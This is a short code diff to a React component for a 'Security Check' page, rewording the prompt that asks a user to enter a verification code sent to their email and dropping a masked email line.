@@ -66,9 +66,8 @@ const SecurityComponent: React.FC = () => {
       <div className="max-w-md mx-auto bg-white p-6 space-y-10 mt-12">
         <h1 className="text-3xl text-[#09275b] font-bold mb-4">Security Check</h1>
         <p className="text-[#a0a0a0] mb-4">
-          We’d like to verify this transaction as this is a new device.
+        We would like to verify your account ownership using the code we sent to your email
           <br />
-          Enter the OTP sent to v****@gmail.com
         </p>
         <div className="flex justify-center mb-4">
           <LockClosedIcon className="h-12 w-12 text-gray-600" />
